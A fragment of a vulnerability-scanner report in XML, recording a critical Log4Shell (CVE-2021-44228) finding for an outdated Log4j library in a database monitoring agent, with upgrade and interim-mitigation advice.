      <ReportItem port="0" svc_name="general" protocol="tcp" severity="4" pluginID="156032" pluginName="Apache Log4j &lt; 2.17.1 Remote Code Execution (Log4Shell)" pluginFamily="Misc.">
        <description>The database monitoring agent on the remote host uses Apache Log4j version 2.14.1 which is vulnerable to CVE-2021-44228 (Log4Shell). This vulnerability allows unauthenticated remote code execution via JNDI injection through specially crafted log messages. The database monitoring agent processes external input from application health checks, creating an attack vector.</description>
        <synopsis>A critical remote code execution vulnerability exists in the Log4j library used by the database monitoring agent.</synopsis>
        <solution>Immediately upgrade Log4j to version 2.17.1 or later. As interim mitigation, set the system property log4j2.formatMsgNoLookups=true.</solution>
